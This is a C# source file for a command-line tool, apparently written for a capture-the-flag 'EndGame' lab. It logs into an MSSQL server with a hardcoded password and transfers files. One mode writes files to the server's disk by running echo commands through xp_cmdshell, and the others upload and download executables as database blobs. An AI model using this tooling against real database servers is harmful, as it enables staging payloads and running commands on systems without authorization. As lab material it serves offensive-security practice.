using System;
using System.Data;
using System.Data.SqlClient;
using System.IO;
namespace POO_SQLConnection
{
	class Program
	{
		public static SqlConnection conn = new SqlConnection();
		public static string databasepath = "";
		public static string localpath = "";
		public static string name = "";
		//
		static void Main(string[] args)
		{
			Console.WriteLine("[+] Tool created for EndGame by PlainText");
			Console.WriteLine("[+] Twitter: @JulioUrena");
			if (args.Length>0)
			{
				string option = args[0];
				if (option == "help")
				{
					Console.WriteLine("");
					Console.WriteLine("[?] Help Option");
					Console.WriteLine(@"Option 1 - SaveTextToDisk: This Option use xp_cmdshell (created to transfer c# code)");
					Console.WriteLine(@"Option 1 - Example: poo.exe 1 c:\users\hacker\file.txt c:\users\destination\file.txt");
					Console.WriteLine(@"Option 2 - UploadExeToDatabase: This Option use	save the file in the database (created to transfer .exe)");
					Console.WriteLine(@"Option 2 - Example: poo.exe 2 c:\users\hacker\file.exe filename");
					Console.WriteLine(@"Option 3 - DownloadExeFromDatabase: This Option	download the file from the database (created to transfer .exe)");
					Console.WriteLine(@"Option 3 - Example: poo.exe 3 c:\users\destination\file.exe filename");
					Environment.Exit(0);
				}
				Console.WriteLine("[+] Connecting to Database...");
				try
				{
					// Database Connection
					string pass = "#p00Pl4inT3xtc3xt3rnalUs3r#";
					conn.ConnectionString = "Server=10.13.38.11;Database=flag;" + "UserId=plaintext;" + "Password=" + pass + ";";
					conn.Open();
					Console.WriteLine("[+] Connection Success");
				}
				catch
				{
					Console.WriteLine("[-] Connection Fail");
					Environment.Exit(0);
				}
				//
				switch (Convert.ToInt32(option))
				{
					case 1:
					//args 1 = Location of the File to send to the database server.
					//args 2 = File destination, where it will be save in the database server
					SaveTextToDisk(args[1], args[2]);
					break;
					case 2:
					//args 1 = Location of the file to upload.
					//args 2 = Filename, is the value of the table to be searched.
					UploadExeToDatabase(args[1],args[2]);
					break;
					case 3:
					//args 1 = Location to save the File
					//args 2 = File destination, where it will be save in the database
					server
					DownloadExeFromDatabase(args[1], args[2]);
					break;
				}
			}
			else
			{
				Console.WriteLine("[-] For more information Use: poo.exe help");
				Environment.Exit(0);
			}
		}
		static void SaveTextToDisk(string lpath,string dbpath)
		{
			// XP_CMDSHELL COMMANDS
			int counter = 0;
			string line;
			//
			// Read the file and display it line by line.
			StreamReader file = new StreamReader(lpath);
			//string cmd_xp = @"echo test>c:\users\public\trial.txt";
			Console.WriteLine("[+] Transfer Started");
			Console.WriteLine("");
			//
			while ((line = file.ReadLine()) != null)
			{
				//Escape > < with ^
				//https://stackoverflow.com/questions/251557/escape-angle-brackets-in-awindows-command-prompt
				if (line.Contains("<"))
				line = line.Replace("<", "^<");
				if (line.Contains(">"))
				line = line.Replace(">", "^>");
				//
				Console.WriteLine(line);
				//
				var xp_cmd = new SqlCommand(@"EXEC master..xp_cmdshell @cmd", conn);
				xp_cmd.Parameters.AddWithValue("@cmd", "echo " + line + @">>"+dbpath);
				xp_cmd.ExecuteNonQuery();
				//
				counter++;
			}
			file.Close();
			Console.WriteLine("There were {0} lines.", counter);
			Console.ReadLine();
			conn.Close();
			Environment.Exit(0);
		}
		//https://stackoverflow.com/questions/2579373/saving-any-file-to-in-the-databasejust-convert-it-to-a-byte-array
		static void UploadExeToDatabase(string lpath, string filename)
		{
			Console.WriteLine("[+] Converting File to Stream");
			//
			// Convert File to Stream
			byte[] file;
			var stream = new FileStream(lpath, FileMode.Open, FileAccess.Read);
			var reader = new BinaryReader(stream);
			file = reader.ReadBytes((int)stream.Length);
			//
			Console.WriteLine("[+] Sending File To Database");
			//
			// SQL Query to Save the File
			string sql = "INSERT INTO plaintext(name,filecontent) VALUES(@param1,@param2)";
			SqlCommand cmd = new SqlCommand(sql, conn);
			cmd.Parameters.AddWithValue("@param1", filename);
			cmd.Parameters.AddWithValue("@param2", file);
			cmd.CommandType = CommandType.Text;
			cmd.ExecuteNonQuery();
			conn.Close();
			//
			Console.WriteLine("[+] File Saved Successfuly");
		}
		static void DownloadExeFromDatabase(string dbpath, string filename)
		{
			Console.WriteLine("[+] Downloading File to Path: " + dbpath);
			try
			{
				//Create File
				var sqlQuery = new SqlCommand(@"SELECT [filecontent] FROM [dbo].[plaintext]
				WHERE [name] = @name", conn);
				sqlQuery.Parameters.AddWithValue("@name", filename);
				var sqlQueryResult = sqlQuery.ExecuteReader();
				if (sqlQueryResult != null)
				{
					sqlQueryResult.Read();
					var blob = new Byte[(sqlQueryResult.GetBytes(0, 0, null, 0,
					int.MaxValue))];
					sqlQueryResult.GetBytes(0, 0, blob, 0, blob.Length);
					using (var fs = new FileStream(dbpath, FileMode.Create, FileAccess.Write)) 
					fs.Write(blob, 0, blob.Length);
				}
				Console.WriteLine("[+] File Saved in " + dbpath);
				Environment.Exit(0);
			}
			catch
			{
				Console.WriteLine("[-] Connection Fail");
				Environment.Exit(0);
			}
		}
	}
}
